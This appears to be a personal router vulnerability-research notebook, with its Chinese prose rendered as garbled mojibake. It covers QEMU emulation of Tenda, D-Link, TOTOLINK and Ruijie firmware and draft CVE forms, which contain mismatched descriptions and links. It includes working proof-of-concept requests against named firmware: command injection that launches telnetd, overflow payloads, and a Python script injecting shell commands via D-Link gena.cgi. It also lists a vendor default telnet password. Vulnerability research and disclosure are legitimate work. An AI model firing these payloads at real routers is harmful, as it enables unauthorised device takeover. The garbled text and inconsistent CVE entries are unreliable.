```

`[%w_-]+`: è¿™æ˜¯ä¸€ä¸ªå­—ç¬¦ç±»æ¨¡å¼ã€‚

åœ¨ Lua ä¸­ï¼Œ`%w` åŒ¹é…æ‰€æœ‰å­—æ¯å’Œæ•°å­—ï¼Œ`_` åŒ¹é…ä¸‹åˆ’çº¿å­—ç¬¦ï¼Œ`-` åŒ¹é…è¿å­—ç¬¦ã€‚æ–¹æ‹¬å· `[]` åˆ›å»ºä¸€ä¸ªå­—ç¬¦é›†ï¼ŒåŒ¹é…é›†åˆä¸­çš„ä»»æ„å•ä¸ªå­—ç¬¦ã€‚åŠ å· `+` è¡¨ç¤ºåŒ¹é…å­—ç¬¦é›†ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚


qemuæ¨¡æ‹Ÿ

```shell
# ç”¨æˆ·çº§qemu
sudo cp $(which qemu-arm-static) .
# sudo cp $(which qemu-mipsel-static) .
# sudo chroot . ./qemu-arm-static /lib/libc.so.6
sudo chroot . ./qemu-arm-static /bin/httpd

#-------------------------------------------------------------------
# ç³»ç»Ÿçº§qemuï¼ˆæ¡¥æ¥ï¼‰
# é…ç½®æœ¬æœºç½‘å¡
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.2.1/24

# å¯åŠ¨è™šæ‹Ÿæœº
./start.sh
# qemuå†…ç½‘ç»œé…ç½®
ifconfig eth0 192.168.2.2
# ifconfig eth1 192.168.2.2
service ssh start

# ä¸Šä¼ æ–‡ä»¶ç³»ç»Ÿ-ä¸»æœº
tar czf rootfs.tar.gz ./rootfs
sudo scp ./rootfs.tar.gz root@192.168.2.2:/root/

# ä¸Šä¼ æ–‡ä»¶ç³»ç»Ÿ-qemu
tar -zxvf ./rootfs.tar.gz
chmod -R 777 ./rootfs
# chmod -R 777 ./squashfs-root

# æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿ
mount -o bind /dev ./rootfs/dev && mount -t proc /proc ./rootfs/proc
# mount -o bind /dev ./squashfs-root/dev && mount -t proc /proc ./squashfs-root/proc
# mount -o bind /dev ./cpio-root/dev && mount -t proc /proc ./cpio-root/proc
chroot ./rootfs sh
# chroot ./squashfs-root sh
```


## CVEæäº¤æœ¬åœ°è¡¨å•

æäº¤å¹³å°ï¼šhttps://cveform.mitre.org/

### AX12+AX9

1
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
AX9 V22.03.01.46

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In the /goform/SetNetControlList feature, the list parameter is passed to sscanf without validation and then further passed to update_dev_name, it is concatenated with an SQL command in snprintf, leading to command injection.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/AX9/SetNetControlList-2.md
__Suggested description of the vulnerability for use in the CVE__
Tenda AX9 V22.03.01.46 has been discovered to contain a SQL command injection vulnerability in the 'list' parameter at /goform/SetNetControlList.
__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd

2
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
AX9 V22.03.01.46

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In theÂ `/goform/SetNetControlList`Â function, theÂ `list`Â parameter is passed toÂ `sscanf`Â without validation and then further passed toÂ `add_tc_traffic_control`.Inside this function, command concatenation occurs inÂ `snprintf`.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/AX9/SetNetControlList-3.md
__Suggested description of the vulnerability for use in the CVE__
Tenda AX9 V22.03.01.46 has been discovered to contain a command injection vulnerability in the 'list' parameter at /goform/SetNetControlList.
__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


3
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
AX9 V22.03.01.46

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In theÂ `/goform/SetOnlineDevName`Â feature, theÂ `mac`Â parameter is passed to theÂ `update_dev_name`Â function without validation. This parameter is concatenated with an SQL command inÂ `snprintf`, leading to a command injection vulnerability.

__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/AX9/SetNetControlList.md
__Suggested description of the vulnerability for use in the CVE__
Tenda AX9 V22.03.01.46 has been found to contain a stack overflow vulnerability in the 'list' parameter at /goform/SetNetControlList.
__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd

4
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
AX9 V22.03.01.46

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the /goform/SetNetControlList function, passing a value to the list parameter assigns it to v1. This then leads to a call to the sub_43FBBC function. Within this function, the strcpy function triggers a stack overflow.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/AX9/SetOnlineDevName.md
__Suggested description of the vulnerability for use in the CVE__
Tenda AX9 V22.03.01.46 has been discovered to contain a SQL command injection vulnerability in the 'mac' parameter at /goform/SetOnlineDevName.
__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd









## è®¾å¤‡ä¿¡æ¯æ”¶é›†

### dlink

DIR-830L

DIR-895L

DIR-890L

DIR-885L

DIR-880L

[DIR-850L](javascript:void(0);)

DIR-826L

DIR-820L

DIR-816L

DIR-810L





å‚è€ƒæ–‡ç« ï¼šhttps://mp.weixin.qq.com/s/9mmccpJVYOvib_af6DAOow





DIR-859

https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-information-disclosure-en-faf1a9a13f3f







# æ¼æ´æŒ–æ˜è®°å½• â›ï¸

## cisco RV340(1.0.03.29 )

imgå›ºä»¶ï¼Œopenwrtå¼€å‘

7zipæå–ubié•œåƒï¼Œå°†å¾—åˆ°çš„ubiæ ¼å¼imgç”¨binwalkè¿›è¡Œè§£å‹

ä¾æ¬¡å¯åŠ¨nginxæœåŠ¡

```Bash
/etc/init.d/boot boot
generate_default_cert
/etc/init.d/confd start
/etc/init.d/nginx start
```

## tenda w30e

ä¼¼ä¹å›ºä»¶å†…æ²¡æœ‰å®Œæ•´çš„webé¡µé¢æ–‡ä»¶ï¼Œæš‚ä¸”æç½®ğŸ˜¢



æ¼æ´ç‚¹åŠŸèƒ½ä¸€èˆ¬æ˜¯åœ¨httpd

```shell
cp $(which qemu-arm-static) .
sudo chroot . ./qemu-arm-static bin/httpd

#qemuå¯åŠ¨httpdç¨‹åºç›®ï¼Œå¹¶å¼€å¯è°ƒè¯•ç«¯å£
sudo chroot . ./qemu-arm-static -g 1234 ./bin/httpd


#æŸ¥çœ‹å¯æ‰§è¡Œç¨‹åºéœ€è¦çš„åŠ¨æ€é“¾æ¥åº“
readelf -d ./bin/httpd | grep NEEDED
#åˆ—å‡ºæ‰€æœ‰çš„å‡½æ•°åï¼Œä¸è¦å¯»æ‰¾çš„å‡½æ•°å¯¹æ¯”
nm -D ./lib/libcommon.so

```

## tenda W20E(v15.11.0.6)

- qemu-arm-staticå¯ä»¥ç›´æ¥ä½¿ç”¨**, **é“¾æ¥`webroot_ro`åˆ°`/webroot`
- ç„¶åå‘ç°httpdæ— æ³•ç›‘å¬80ç«¯å£, æ˜¾ç¤ºg_lan_ip=0.
- IDAå’ŒæŸ¥çœ‹webroot_roå‘ç°default.cfgä¸­å­˜äº†g_lan_ip, ä¸ºéé›¶å€¼, GetValueå‡½æ•°è´Ÿè´£è¯»å–è¯¥æ–‡ä»¶. 
- è¿›åˆ°libcommon.so.0å‘ç°è¯¥å‡½æ•°å’Œcfmdè¿›ç¨‹é€šä¿¡è·å–çš„è¯¥æ•°å€¼, è€Œcfmdçš„å¯åŠ¨åˆéœ€è¦mtdè®¾å¤‡ç­‰ç­‰,  äºæ˜¯**è‡ªå·±å†™ä¸€ä¸ªGetValueå‡½æ•°è¿›è¡Œhook, ç›´æ¥ä½¿ç”¨æ–‡ä»¶è¯»å–**: https://pastebin.ubuntu.com/p/8tQXJHQd3h/
- æŸ¥çœ‹`/lib`ä¸‹çš„libc, å‘ç°æ˜¯uClibc, ç¼–è¯‘å‚è€ƒ[è¿™é‡Œ](https://iotsec-zone.com/article?id=202#4ã€Netgear  R8300å›ºä»¶æ¨¡æ‹Ÿï¼ˆqemu-userï¼‰):

```Bash
#compile lib.so
LD_LIBRARY_PATH=/root/tools/IOT/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3/lib
apt install libelf-dev:i386  
ln -s /root/tools/IOT/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc /bin/ugcc
ugcc -shared -fPIC -Wall getvalue.c -o getvalue.so
#in chroot env:
./qemu-arm-static -E LD_PRELOAD=/getvalue.so /bin/httpd
```

- å‘ç°æ— æ³•ç™»é™†, ä»€ä¹ˆå¯†ç éƒ½ä¸è¡Œ. äºæ˜¯æ‰¾åˆ°ç™»é™†å‡½æ•°`authSecurityHandler`****patchè·³è¿‡å¯†ç strcmp.
- å•å‘ç°ç½‘é¡µå¡ä½äº†æ— æ³•æ˜¾ç¤ºè®¾ç½®çš„é€‰é¡¹å’ŒæŒ‰é’®,å®‰è£…gdb-multiarchè°ƒè¯•äº†ä¸‹. åœ¨ç½‘é¡µå¡ä½æ—¶ctrl+cä¸­æ–­ååˆç»§ç»­è¿è¡Œ, å°±ä¸å¡äº†, è¿˜æ˜¾ç¤º`ucloud_p_sem: syscall interrupt`, **patchäº†ucloud_p_semå‡½æ•°.**
- æŸäº›pocå°±æ˜¯åœ¨ä¹±å†™, å‘ç°åœ¨`parseFirstLine`å‡½æ•°ä¸­æœ‰URI too bigçš„2048é•¿åº¦é™åˆ¶, æŠŠä¸€äº›æ ˆæº¢å‡ºçš„é•¿åº¦æ”¹åœ¨è¿™ä¸ªé™åˆ¶ä¹‹å†…å³å¯éªŒè¯. 



## totolink A7000R\NR1800X\X5000R

é€šè¿‡github Actionç¯å¢ƒçš„docker+qemu-systemç³»ç»Ÿæ¨¡å¼æ­å»ºï¼š

1.dockerä¸­å®‰è£…qemu-system-mipselï¼Œéœ€è¦æå‰å°†å›ºä»¶æ–‡ä»¶ç³»ç»Ÿä¸Šä¼ åˆ°qemuå¯åŠ¨çš„é•œåƒæ–‡ä»¶ä¸­(æœ¬åœ°ä½¿ç”¨tapèµ·qemuå°†æ–‡ä»¶ç³»ç»Ÿscpè¿‡å»ï¼Œæˆ–è€…åˆ«çš„æ–¹å¼ä¹Ÿå¯ä»¥)

2.ç¼–å†™shè„šæœ¬å®ç°qemu-system-mipselè‡ªåŠ¨ç™»å½•

3.dockerfileç¼–å†™å®‰è£…éœ€è¦çš„ä¾èµ–

shè„šæœ¬(åˆ«çš„ç³»ç»Ÿéœ€è¦ä¿®æ”¹ä¸ºå¯¹åº”ç³»ç»Ÿå)

```Bash
cd /root/
/usr/bin/expect<<EOF
set timeout 10000

spawn qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic \
    -net user,hostfwd=tcp::80-:80 -nographic

expect "debian-mipsel login:"
send "root\r"

#expect "root@debian-mipsel:~# "
#send "echo 0 > /proc/sys/kernel/randomize_va_space\r"

expect "Password:"
send "root\r"

expect "root@debian-mipsel:~# "
send "mount -o bind /dev ./squashfs-root/dev && mount -t proc /proc ./squashfs-root/proc\r"

expect "root@debian-mipsel:~# "
send "chroot squashfs-root/ /bin/sh\r"

expect "# "
send "ifconfig\r"

expect "# "
send "./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf\r"
expect "# "

expect eof
EOF
#cd /root/squashfs-root
#./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf
sleep infinity;
```

Dockerfile

```Bash
FROM ubuntu:16.04

RUN apt update \
    && apt install -y qemu-system-mipsel \
    && apt install -y xz-utils \
    && apt install -y net-tools \
    && apt install -y expect \
    && apt install -y bridge-utils uml-utilities openssh-server

COPY debian_wheezy_mipsel_standard.qcow2 /root/debian_wheezy_mipsel_standard.qcow2

COPY vmlinux-3.2.0-4-4kc-malta /root/vmlinux-3.2.0-4-4kc-malta

COPY start.sh /root/start.sh

CMD [ "/bin/sh", "-c", "/root/start.sh" ]
```

æ„å»ºå¥½dockeråï¼Œå°±å¯ä»¥å°†å®¹å™¨ä¸Šä¼ åˆ°è‡ªå·±çš„githubä»“åº“

ç„¶åexploit_dbä¸­ä½¿ç”¨çš„dockerfileå¯ä»¥ç›´æ¥è¿™æ ·

```Bash
FROM xxx/xxx:version
```

è¿™æ ·å°±èƒ½è§£å†³github actionä¸­è·‘dockerï¼ŒåŒæ—¶ï¼Œdockerä¸Šè¿è¡Œqemu-systemçš„å„ç§é—®é¢˜



## tplink ER5120G

CVE-2023-43138	TPLINK TL-ER5120G 4.0 2.0.0 Build 210817 Rel.80868nå­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…åœ¨è®¤è¯åæ·»åŠ NAPTè§„åˆ™ï¼Œä¸”è§„åˆ™åç§°å¸¦æœ‰æ³¨å…¥ç‚¹ã€‚
CVE-2023-43137	TPLINK TL-ER5120G 4.0 2.0.0 Build 210817 Rel.80868nå­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…åœ¨è®¤è¯åæ·»åŠ ACLè§„åˆ™ï¼Œè§„åˆ™åç§°å‚æ•°å­˜åœ¨æ³¨å…¥ç‚¹ã€‚

CVE-2023-43135    TP-LINK ER5120G 4.0 2.0.0 Build 210817 Rel.80868nä¸­å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ï¼Œæ”»å‡»è€…æ— éœ€èº«ä»½éªŒè¯å³å¯è·å–è®¾å¤‡æ•æ„Ÿä¿¡æ¯ï¼Œè·å–ç”¨æˆ·ä»¤ç‰Œï¼Œæœ€ç»ˆç™»å½•è®¾å¤‡åå°ç®¡ç†ã€‚





## dlink 900WO



## tplink IP43AN









## ruijie WS6008_WS6108



/tmp/html/web/routers/common/system/file.lua   downFiles

sbin/auto_route/routelib.lua  routelib.get_pub_network_intf_and_sip



```shell
cd '/data/sourcedir'
rm -f '/tmp/vsd/0/destination.tar'
tar -cf '/tmp/vsd/0/destination.tar' 'file1.txt' 'file2.txt'
sync
```



```http
POST /web/init.lua/common.system.file/downFiles HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 44
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: LOCAL_LANG_COOKIE=zh; UI_LOCAL_COOKIE=zh; SIDS=F1734C792A0F5152FF2BC70F48738AA1; login=1; mac=0074.9c0c.797b; oid=1.3.6.1.4.1.4881.1.3.1.1.115; hotback_num=128; MODE_LOCAL=0; main_ui_cookie=menu_file_manage
Host: 192.168.1.2
Origin: https://192.168.1.2
Referer: https://192.168.1.2/common/file/file-admin.htm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Connection: close


params=%7B%22src%22%3A%22%2Fdata%22%2C%22dst%22%3A%221.tar%22%2C%22list%22%3A%5B%221%27%3Btelnetd%27%22%5D%7D
```



## datacon

https://xz.aliyun.com/t/5808#toc-0





uhttpd : 0x8052612/0x8051BF2

```
ustream_printf(cl_0->us, "Location: %s\r\n\r\n", string_1);
ustream_printf(cl_0->us, "%s: %s\r\n", v4, string_0);
```

odhcpd: 0x4AAB 

```
v10 = strcpy(addr4.s_addr, name)
```

0x5DBB

```
v96 = malloc(v95 + 1);
```

0x5F69

```c
v105 = realloc(*(v7 + 584), 4 * v104);
```







## dlink dir-850L

#### bug1

```http
POST /pigwidgeon.cgi HTTP/1.0

Host: shareport.local

Cookie: uid=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Prefix: asasdaw

Cache-Control: max-age=0

Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "Linux"

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: none

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 21
```



#### bug2

```http
GET /scandir.sgi?action=umnt&en=;telnetd -&path=aaa&where=bbb HTTP/1.0

Host: shareport.local

Cookie: uid=unUFIr9ia

Cache-Control: max-age=0

Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "Linux"

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: none

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close
```



#### bug3

```http
POST /captcha.cgi HTTP/1.1

Host: 192.168.0.1

Cookie: uid=xrU7UqR6kP

Content-Length: 9

Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"

Sec-Ch-Ua-Platform: "Linux"

Sec-Ch-Ua-Mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36

Content-Type: application/x-www-form-urlencoded

Accept: */*

Origin: https://192.168.0.1

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://192.168.0.1/info/Login.html

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close



DUMMY=YES
```

#### bug4

```HTTP
POST /fwupload.cgi HTTP/1.1

Host: shareport.local

Cookie: uid=qxPQB9fty

Content-Length: 9961750

Cache-Control: max-age=0

Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "Linux"

Upgrade-Insecure-Requests: 1

Origin: https://shareport.local

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOtYaEb8JA6svPVR2

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Referer: https://shareport.local/UpdateFirmware.html

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close



------WebKitFormBoundaryOtYaEb8JA6svPVR2

Content-Disposition: form-data; name="select_Folder_a"; filename="EW_3.0(1)B11P226_EW1200G_10211312_install_encypto.bin"

Content-Type: application/octet-stream



upgrade_crypt_v1!@2021ÃqÃ£Â«Ã­Ã¯Ã«|~Ã?U6Â¢Ã¾oÃ¾oÂ Âº.zz}|26/,_0(
_3
------WebKitFormBoundaryOtYaEb8JA6svPVR2--


```

#### bug5

```python
import socket
from time import sleep


def exp(server, port, shell_file):
    print('\n[*] Connection {host}:{port}').format(host=server, port=port)
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\n"
    request += "Host: " + str(server) + str(port) + "\n"
    request += "Callback: <http://192.168.0.2/>\n"
    request += "NT: upnp:event\n"
    request += "Timeout: Second-infinite Second-1800\n"
    request += "Accept-Encoding: gzip, deflate\n"
    request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"
    sleep(1)
    print('[*] Sending Payload')
    con.connect((socket.gethostbyname(server),port))
    con.send(request.encode())
    results = con.recv(4096)

exp('192.168.0.1', 49152, '`touch /flag4`')
```



## dlink Dir-842

`socket(2, 2, 0)` è°ƒç”¨åˆ›å»ºäº†ä¸€ä¸ªIPv4(AF_INETï¼Œå› ä¸ºç¬¬ä¸€ä¸ªå‚æ•°æ˜¯2)çš„æµå¼å¥—æ¥å­—(SOCK_STREAMï¼Œå› ä¸ºç¬¬äºŒä¸ªå‚æ•°æ˜¯2)ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡å®šçš„æ˜¯ä½¿ç”¨é»˜è®¤çš„åè®®(é€šå¸¸æ˜¯TCP)ã€‚

` 0x7F000001` è¡¨ç¤ºä½¿ç”¨å›ç¯åœ°å€(127.0.0.1)

load_all_modules



## dlink dir-821 ca

å›ºä»¶åŠ å¯†



## tenda AX12

### bug1

0x42F69C

/goform/setMacFilterCfg



<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231121191829134.png" alt="image-20231121191829134" style="zoom:50%;" />

**poc**

```http
POST /goform/setMacFilterCfg HTTP/1.1
Host: 192.168.11.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 51
Origin: http://192.168.11.1
Connection: close
Referer: http://192.168.11.1/iptv.html?random=0.7642888131213508&
Cookie: password=7c90ed4e4d4bf1e300aa08103057ccbcmho1qw


macFilterType=black&deviceList=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac\r

```



### bug2 

0x43AF3C

goform/SetVirtualServerCfg



### bug3

0x43B3C4

goform/SetStaticRouteCfg



### bug4

0x43FDCC

goform/SetNetControlList





## tenda AX2

tendaé€šç”¨telnetå¯†ç Fireitup
https://www.anquanke.com/post/id/283630#h3-2
AX12çœŸæœºåˆ†æ



## tenda AX9

bug1

0x42F69C

bug2

0x43AF3C

bug3

0x43B3C4

bug4

0x43FDCC



bug5

0x42C808



setModules/setDeviceInfo

![image-20231122140708612](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231122140708612.png)



bug6

0x430304 

goform/SetOnlineDevName



bug7

0x43FBBC

goform/SetNetControlList



bug8

0x43FA38

goform/SetNetControlList


è¿™ä¸ªè·¯ç”±å™¨ä¸»è¦è¯»å–é…ç½®æ–‡ä»¶å®Œæˆç½‘ç»œæœåŠ¡é…ç½®ï¼Œå¯ä»¥å†™åœ¨æ–‡ä»¶ç³»ç»Ÿé‡Œ

/etc/config/network
```c
config interface 'lookback'
        option ifname 'lo'
        option proto 'static'
        option ipaddr '127.0.0.1'
        option netmask '255.0.0.1'
 
config globals 'globals'
 
config interface 'lan'
        option type 'bridge'
        option proto 'static'
        option ipaddr '127.0.0.1'
        option netmask '255.255.255.0'
```

å‚è€ƒæ–‡ç« ï¼š
[Tenda Ax12 è®¾å¤‡åˆ†æ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°](https://www.anquanke.com/post/id/283630#h3-9)

## tenda AX3
armæ¶æ„ï¼Œè¿™ä¸ªå›ºä»¶è§£å‹åå¸¦æœ‰ç¬¦å·è¡¨ï¼ŒåŸºäºgoheadï¼Œetc->etc_ro webroot->webroot_roé‚£ä¸€å¥—ä¸œè¥¿

```shell
sudo cp $(which qemu-arm-static) .
sudo chroot . ./qemu-arm-static ./bin/httpd
```

å¯åŠ¨åå‘ç°å¡ä½ï¼Œå’Œw20eä¸€æ ·çš„æƒ…å†µï¼Œç”±äºæ²¡æœ‰æŠ¥é”™å¤§æ¦‚ç‡æ˜¯è¿›å¾ªç¯äº†

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231124193644.png)

æ”¹åˆ¤æ–­


ç„¶åæ‰¾ä¸åˆ°å˜é‡å€¼ï¼Œæ˜¯å› ä¸ºç¼ºå°‘è·å–å€¼çš„å‡½æ•°ï¼Œéœ€è¦hookä¸€ä¸‹ï¼Œhookæ–¹å¼åŒw20e
åŠ«æŒsetvalueå‡½æ•°ï¼Œç¼–è¯‘å¾—åˆ°å¦‚ä¸‹hook.so
![[hook.so]]

```shell
sudo chroot . ./qemu-arm-static -E LD_PRELOAD=./hook.so ./bin/httpd
```

ç„¶åä¿®å¤ä¸€ä¸‹è½¯è¿æ¥ï¼Œå»etc/default.cfgé‡Œæ”¹ipï¼Œå°±èƒ½è®¿é—®äº†ï¼Œä½†æ˜¯ç™»å½•ä¸äº†ï¼Œåº”è¯¥è¦patchä¸€ä¸‹

# æ¼æ´å¤ç°

## Cisco SPA112

### æ¼æ´åˆ†æ







### åˆ©ç”¨åˆ†æ





## DIR-846

ç¯å¢ƒæ­å»º

**FrimAEæ€ä¹ˆçœ‹åˆ°è¾“å‡ºå•Šï¼Ÿ** æŸ¥çœ‹æ—¥å¿—

å‘ç°è¢«å¯¼å‘index.htmlï¼Œhnap 503 æŠ¥é”™ï¼Œè¿™ç§æƒ…å†µæŸ¥çœ‹æ—¥å¿—

```shell
ps | grep http
cat /etc/lighttpd/lighttpd.conf | grep log
touch /error
vi /etc/lighttpd/lighttpd.conf
# ä¿®æ”¹æ—¥å¿—è·¯å¾„
```

é‡æ–°å¯åŠ¨æœåŠ¡

```shell
kill -9 186 & /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf
```

æŸ¥çœ‹æ—¥å¿—è¾“å‡ºï¼Œå‘ç°phpæœªèƒ½å¯åŠ¨

```shell
find . -name "*php*"
```

å¯åŠ¨phpæœåŠ¡å³å¯

### æ¼æ´åˆ†æ

phpæœåŠ¡ï¼Œæ‰¾åˆ°phpå‡½æ•°ä»¥åï¼Œç­›é€‰execå‡½æ•°

```shell
config system
        option hostname rtkmips
        option timezone ''`id > /tmp/result`''
```



```php
<?php

class SetNTPServerSettings extends GetMultipleHNAPs
{
    function __construct($act_val)
    {
        parent::__construct($act_val);
    }

    public function actionIndex()
    {
        $option = $this->act_val;
        $system_info = read_cfg_info("system");
        $system_info = add_or_update_option_info($system_info, "system", "", "timezone", $option['system_time_timezone']);
        save_cfg_info("system", $system_info);
        exec("/etc/init.d/system  restart");
        $result['SetNTPServerSettingsResult'] = "OK";
        $this->api_response(__CLASS__, $result);
    }
}
```





```php
<?php
set_time_limit(300);

class SetNetworkTomographySettings extends GetMultipleHNAPs
{
    function __construct($act_val)
    {
        parent::__construct($act_val);
    }

    public function actionIndex()
    {
        $result['SetNetworkTomographySettingsResult'] = "FAIL";
        $option = $this->act_val;

        $ping_number_range = array("options" => array("min_range" => 1, "max_range" => 50));
        $ping_size_range = array("options" => array("min_range" => 4, "max_range" => 1472));

        if (!filter_var($option['tomography_ping_number'], FILTER_VALIDATE_INT, $ping_number_range)) {  //æ ¡éªŒpingæ¬¡æ•°èŒƒå›´
            $result["message"] = "pingçš„æ¬¡æ•°ä¸åˆæ³•";
        } elseif (!filter_var($option['tomography_ping_size'], FILTER_VALIDATE_INT, $ping_size_range)) {  //æ ¡éªŒpingåŒ…å¤§å°èŒƒå›´
            $result["message"] = "pingåŒ…å¤§å°ä¸åˆæ³•";
        } elseif (!(filter_var($option['tomography_ping_address'], FILTER_VALIDATE_IP)  //æ ¡éªŒæ˜¯å¦ä¸ºåˆæ³•IPæˆ–åŸŸå
            || check_domain($option['tomography_ping_address']))) {
            $result["message"] = "ä¸æ˜¯åˆæ³•çš„IPæˆ–åŸŸå";
        } else {
            exec("ping -c " . $option['tomography_ping_number'] . " -s " . $option['tomography_ping_size'] . " '" . $option['tomography_ping_address'] . "' > /tmp/ping.result");
            file_put_contents("/etc/.SetNetworkTomography", json_encode($option));
            $result['SetNetworkTomographySettingsResult'] = "OK";
        }
        $this->api_response(__CLASS__, $result);
    }
}
```





### åˆ©ç”¨åˆ†æ

